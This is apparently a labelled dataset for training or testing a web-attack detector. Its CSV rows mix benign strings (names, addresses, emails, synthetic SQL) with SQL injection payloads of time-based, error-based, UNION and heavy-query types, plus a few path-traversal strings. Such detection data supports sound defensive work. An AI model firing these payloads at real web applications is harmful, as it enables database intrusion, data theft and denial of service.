payload,attack_type,is_attack,source
"1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli,1,SQLiV3
1437,norm,0,HttpParamsDataset
/../../../../../../../{file},path-traversal,1,HttpParamsDataset
5966,norm,0,HttpParamsDataset
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",sqli,1,SQLiV3
"-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '",sqli,1,SQLiV3
3.4008E+015,norm,0,SQLiV3
-1603')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('abmo'='abmo,sqli,1,HttpParamsDataset
SELECT * FROM generally WHERE brief = 'particles',norm,0,SQLiV3
 or ''  =  ',sqli,1,SQLiV3
SELECT * FROM vowel,norm,0,SQLiV3
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,HttpParamsDataset
0ap7r344c6,norm,0,HttpParamsDataset
c/ pereiras 149,norm,0,HttpParamsDataset
nalbach0@softwaremasservicio.aero,norm,0,HttpParamsDataset
"-8838"")) as xisn where 2749=2749 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,HttpParamsDataset
"1%"");select case when 9390=5752 then 1 else null end--",sqli,1,HttpParamsDataset
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",sqli,1,HttpParamsDataset
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,sqli,1,SQLiV3
celso,norm,0,HttpParamsDataset
1))) or sleep(5) and (((2209=2209,sqli,1,HttpParamsDataset
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",sqli,1,SQLiV3
"1""  )   as nyui where 2511  =  2511",sqli,1,SQLiV3
tebbe,norm,0,HttpParamsDataset
-saborete,norm,0,HttpParamsDataset
"INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  ",norm,0,SQLiV3
"lapa, la",norm,0,HttpParamsDataset
"   SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID ) ",norm,0,SQLiV3
SELECT * FROM sure WHERE rhythm BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
1' and 9198  =  9198--,sqli,1,SQLiV3
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('xngr'='xngr",sqli,1,HttpParamsDataset
81568460h,norm,0,HttpParamsDataset
SELECT * FROM loose WHERE industry  BETWEEN 10 AND 20,norm,0,SQLiV3
"-8783')) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",sqli,1,HttpParamsDataset
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,HttpParamsDataset
SELECT * FROM tone WHERE several BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
"1"" and elt  (  4249  =  4249,7259  )  ",sqli,1,SQLiV3
kari,norm,0,HttpParamsDataset
"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",sqli,1,SQLiV3
"1 and make_set  (  8403  =  8403,8899  )  ",sqli,1,SQLiV3
15850392b,norm,0,HttpParamsDataset
e5f215o6o,norm,0,HttpParamsDataset
SELECT * FROM whether WHERE ruler = 'trouble' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
SELECT * FROM clay WHERE shallow IN  ( SELECT enough FROM flag ) ,norm,0,SQLiV3
4803866422185035,norm,0,HttpParamsDataset
marge,norm,0,HttpParamsDataset
SELECT boy ( s )  FROM card SELECT carry ( s ) ,norm,0,SQLiV3
sincr5nica,norm,0,HttpParamsDataset
/../..//..///{file},path-traversal,1,HttpParamsDataset
SELECT DISTINCT straight FROM community,norm,0,SQLiV3
valdivieso,norm,0,HttpParamsDataset
"1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '",sqli,1,SQLiV3
SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being',norm,0,SQLiV3
"   SELECT COUNT ( no ) , old FROM room BY unless",norm,0,SQLiV3
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,HttpParamsDataset
48310,norm,0,HttpParamsDataset
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,sqli,1,SQLiV3
..web-infweb.xml,path-traversal,1,HttpParamsDataset
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",sqli,1,SQLiV3
"c/ madre castisima, s/n",norm,0,HttpParamsDataset
"  SELECT * FROM belt WHERE sharp NOT IN  ( 'smell', 'opportunity', 'start' )  ",norm,0,SQLiV3
"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 262310,262326,262328 ) ",norm,0,SQLiV3
49160,norm,0,HttpParamsDataset
1   )    ) ,sqli,1,SQLiV3
vazkn,norm,0,HttpParamsDataset
6020931193339547,norm,0,HttpParamsDataset
iznatoraf,norm,0,HttpParamsDataset
cerceda,norm,0,HttpParamsDataset
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",sqli,1,SQLiV3
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",sqli,1,HttpParamsDataset
3348558480673240,norm,0,HttpParamsDataset
"   SELECT Employees.level, COUNT ( Orders.additionID )  AS circusFROM    ( OrdersINNER JOIN service ON Orders.southID  =  Employees.stairsID ) ",norm,0,SQLiV3
7562939151589208,norm,0,HttpParamsDataset
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli,1,SQLiV3
60586849l,norm,0,HttpParamsDataset
"-3169"" order by 1#",sqli,1,HttpParamsDataset
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,HttpParamsDataset
"1) where 3915=3915 union all select null,null,null,null#",sqli,1,HttpParamsDataset
-4410 where 5749  =  5749 or 1317  =  9823--,sqli,1,SQLiV3
"c/ portalegre 43,",norm,0,HttpParamsDataset
antanas,norm,0,HttpParamsDataset
zoq3et1r8,norm,0,HttpParamsDataset
mallku,norm,0,HttpParamsDataset
5695809811217784,norm,0,HttpParamsDataset
"1%"" or 4240=(select 4240 from pg_sleep(5))--",sqli,1,HttpParamsDataset
pimentel gatius,norm,0,HttpParamsDataset
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli,1,SQLiV3
"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli,1,SQLiV3
"-5170')) as ovbf where 4833=4833 union all select 4833,4833,4833,4833--",sqli,1,HttpParamsDataset
"1' in boolean mode) or 8421=(select count(*) from generate_series(1,5000000))#",sqli,1,HttpParamsDataset
pl. herrera de los navarros 68 12-h,norm,0,HttpParamsDataset
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xdce'='xdce",sqli,1,HttpParamsDataset
hermindo,norm,0,HttpParamsDataset
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",sqli,1,SQLiV3
"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",sqli,1,SQLiV3
SELECT * FROM six WHERE NOT community = 'famous'  AND NOT luck = 'engine',norm,0,SQLiV3
"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,sqli,1,SQLiV3
"-2896')) as wisk where 1030=1030 union all select 1030,1030,1030,1030#",sqli,1,HttpParamsDataset
brendel@esposo.com.lk,norm,0,HttpParamsDataset
"  SELECT his AS available, medicine AS [hope]  FROM vegetable",norm,0,SQLiV3
alarba,norm,0,HttpParamsDataset
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy",sqli,1,HttpParamsDataset
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',sqli,1,SQLiV3
34361279s,norm,0,HttpParamsDataset
5668,norm,0,HttpParamsDataset
SELECT adult ( s )  FROM season SELECT easy ( s ) ,norm,0,SQLiV3
